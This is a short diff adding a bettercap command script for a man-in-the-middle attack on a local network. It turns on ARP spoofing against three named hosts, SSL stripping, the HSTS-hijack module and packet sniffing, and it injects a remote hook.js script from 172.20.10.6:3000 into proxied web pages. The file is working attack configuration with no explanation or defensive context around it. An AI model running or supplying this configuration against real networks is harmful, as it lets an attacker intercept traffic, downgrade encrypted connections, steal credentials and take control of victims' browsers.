@@ -1,0 +1,9 @@
+net.probe on
+set http.proxy.sslstrip true
+set http.proxy.inject.js 172.20.10.6:3000/hook.js
+http.proxy on
+set arp.spoof.fullduplex true 
+set arp.spoof.targets 172.20.10.1,172.20.10.3,172.20.10.5 
+arp.spoof on
+net.sniff on
+hstshijack/hstshijack
